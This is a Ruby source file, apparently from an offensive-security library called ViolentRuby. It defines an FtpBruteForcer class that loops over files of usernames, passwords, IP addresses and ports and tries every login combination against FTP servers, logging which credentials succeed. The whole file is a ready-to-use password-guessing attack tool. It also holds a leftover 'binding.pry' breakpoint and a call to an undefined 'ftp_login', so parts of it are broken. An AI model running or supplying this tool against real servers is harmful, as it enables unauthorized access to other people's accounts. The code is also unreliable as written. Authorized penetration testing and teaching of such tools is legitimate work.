require 'net/ftp'

module ViolentRuby
  # The Ftp Brute Forcer class provides a simply way to 
  # brute-force an FTP server's credentials. 
  # @author Kent 'picat' Gruber
  #
  # @example Basic Usage
  #   ftp = FtpBruteForcer.new
  #   ftp.users     = "resources/ftp_users.txt"
  #   ftp.passwords = "resources/ftp_passwords.txt"
  #   ftp.ips       = "resources/ftp_ips.txt"
  #   ftp.ports     = "resources/ftp_ports.txt"
  #   # brue'm!
  #   ftp.brute_force!
  #   # => results
  #
  class FtpBruteForcer 
    attr_accessor :users
    attr_accessor :passwords
    attr_accessor :ips
    attr_accessor :ports

    # Create a new Ftp Brute Forcer.
    #
    # @param [Hash] args The options to create a new Ftp Brute Forcer.
    # @param args [String] :users The path to a file of users to attempt.
    # @param args [String] :passwords The path to a file of passwords to attempt.
    # @param args [String] :ips The path to a file of server ips to attempt to connect to.
    # @param args [String] :ports The path to a file of service ports to attempt to connect to.
    def initialize(args = {})
      @users     = args[:users]     if args[:users]     && File.readable?(args[:users]) 
      @passwords = args[:passwords] if args[:passwords] && File.readable?(args[:passwords])
      @ips       = args[:ips]       if args[:ips]       && File.readable?(args[:ips])
      @ports     = args[:ports]     if args[:ports]     && File.readable?(args[:ports])
      @ftp       = Net::FTP.new
    end

    # Brute force some'a dem FTP login credz.
    #
    # @param [Hash] args The options to brute force. 
    # @param args [String] :users The path to a file of users to attempt.
    # @param args [String] :passwords The path to a file of passwords to attempt.
    # @param args [String] :ips The path to a file of server ips to attempt to connect to.
    # @param args [String] :ports The path to a file of service ports to attempt to connect to.
    def brute_force(args = {})
      meets_our_requirements?(args) 
      results   = []
      ips       = args[:ips]        || @ips 
      ports     = args[:ports]      || @ports
      users     = args[:users]      || @users
      passwords = args[:passwords]  || @passwords
      iterate_over(ips).each do |ip|
        iterate_over(ports).each do |port|
          next unless connectable?(ip: ip, port: port)
          binding.pry
          iterate_over(users).each do |user|
            iterate_over(passwords).each do |password|
              if able_to_login?(ip: ip, port: port, username: user, password: password)
                puts "yup"
                results << format_result("SUCCESS", ip, port, user, password)
              else
                puts "nope"
                results << format_result("FAILURE", ip, port, user, password)
              end
            end
          end
        end
      end
      results
    end

    def connectable?(args = {})
      @ftp.connect(args[:ip], args[:port])
      return true if @ftp.last_response_code == "220"
      false
    rescue
      false
    end

    def able_to_login?(args = {})
      #@ftp_login ||= Net::FTP.new
      @ftp.connect(args[:ip], args[:port])
      @ftp.login(args[:username], args[:password]) 
      if @ftp.welcome == "230 Login successful.\n"
        @ftp.close
        return true
      end
      ftp_login.quit
      false
    rescue
      false
    end

    alias brute_force! brute_force

    private

    def format_result(type, ip, port, user, password)
      { time: Time.now, type: type, ip: ip, port: port, user: user, password: password }
    end


    def iterate_over(file)
      File.foreach(file).map(&:strip)
    end

    def meets_our_requirements?(args = {})
      raise "No ip addresses to connect to." unless ips?(args)
      raise "No ports to connect to." unless ports?(args)
      raise "No passwords to try." unless passwords?(args)
      raise "No users to try." unless users?(args)
      true
    end

    def ips?(args = {})
      return true if args[:ips]
      return true if @ips
      false 
    end

    def passwords?(args = {})
      return true if args[:passwords]
      return true if @passwords
      false
    end

    def ports?(args = {})
      return true if args[:ports]
      return true if @ports
      false
    end

    def users?(args = {})
      return true if args[:users]
      return true if @users
      false
    end



  end
end
